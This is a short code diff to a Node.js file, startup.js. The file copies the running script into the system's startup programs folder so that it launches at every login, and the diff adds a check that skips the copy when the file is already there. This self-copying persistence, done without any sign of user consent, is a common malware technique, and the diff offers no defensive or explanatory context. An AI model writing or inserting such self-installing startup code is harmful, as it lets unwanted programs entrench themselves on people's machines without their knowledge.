startup

+++ util/functions/startup.js
@@ -1,11 +1,14 @@
 const { paths: { startupPrograms } } = require('../variables');
-const { copyFile } = require('fs');
+const { copyFile, existsSync } = require('fs');
 const { resolve, sep } = require('path');
 
 const file = process.argv[1];
 const fileName = file.split(sep).pop();
 
-// Copy itself to startup programs
-copyFile(file, resolve(startupPrograms, fileName), (err) => {
-  if (err) console.error(err);
-});
+// If not already in startup programs, put it in those
+if (!existsSync(resolve(startupPrograms, fileName))) {
+  // Copy itself to startup programs
+  copyFile(file, resolve(startupPrograms, fileName), (err) => {
+    if (err) console.error(err);
+  });
+}
